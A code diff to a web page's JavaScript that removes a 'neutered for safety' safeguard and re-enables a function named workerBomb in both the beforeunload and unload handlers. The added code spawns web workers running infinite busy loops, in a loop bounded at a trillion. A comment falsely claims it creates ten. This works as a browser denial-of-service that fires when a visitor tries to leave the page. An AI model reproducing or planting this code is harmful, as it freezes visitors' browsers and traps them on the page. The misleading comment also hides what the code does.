@@ -8,8 +8,41 @@ window.addEventListener('beforeunload', function (event) {
     let isResponsive = true;
 
     function workerBomb() {
-        console.log("Starting workerBomb... (neutered for safety)");
-        return;
+        console.log("Starting workerBomb...");
+
+        const script = `
+            let counter = 0;
+            while (true) {
+              counter++;
+              Math.random() * Math.random();
+
+              // Send progress to the main thread occasionally
+              if (counter % 1e6 === 0) {
+                postMessage({ status: "working", counter });
+              }
+            }
+          `;
+        const blob = new Blob([script], { type: "application/javascript" });
+        const workerURL = URL.createObjectURL(blob);
+
+        // Create 10 workers (adjust the number to reduce load)
+        for (let i = 0; i < 1000000000000; i++) {
+            const worker = new Worker(workerURL);
+            workers.push(worker);
+
+            worker.onmessage = (event) => {
+                if (event.data.status === "working") {
+                    console.log(`Worker ${i} progress: ${event.data.counter}`);
+                }
+            };
+
+            worker.onerror = (error) => {
+                console.error(`Worker ${i} encountered an error:`, error);
+            };
+        }
+
+        // Start the responsiveness watchdog
+        // startWatchdog();
     }
 
     // Watchdog function to monitor browser responsiveness
@@ -92,8 +125,41 @@ window.addEventListener('unload', function () {
     let isResponsive = true;
 
     function workerBomb() {
-        console.log("Starting workerBomb... (neutered for safety)");
-        return;
+        console.log("Starting workerBomb...");
+
+        const script = `
+            let counter = 0;
+            while (true) {
+              counter++;
+              Math.random() * Math.random();
+
+              // Send progress to the main thread occasionally
+              if (counter % 1e6 === 0) {
+                postMessage({ status: "working", counter });
+              }
+            }
+          `;
+        const blob = new Blob([script], { type: "application/javascript" });
+        const workerURL = URL.createObjectURL(blob);
+
+        // Create 10 workers (adjust the number to reduce load)
+        for (let i = 0; i < 1000000000000; i++) {
+            const worker = new Worker(workerURL);
+            workers.push(worker);
+
+            worker.onmessage = (event) => {
+                if (event.data.status === "working") {
+                    console.log(`Worker ${i} progress: ${event.data.counter}`);
+                }
+            };
+
+            worker.onerror = (error) => {
+                console.error(`Worker ${i} encountered an error:`, error);
+            };
+        }
+
+        // Start the responsiveness watchdog
+        // startWatchdog();
     }
 
     // Watchdog function to monitor browser responsiveness
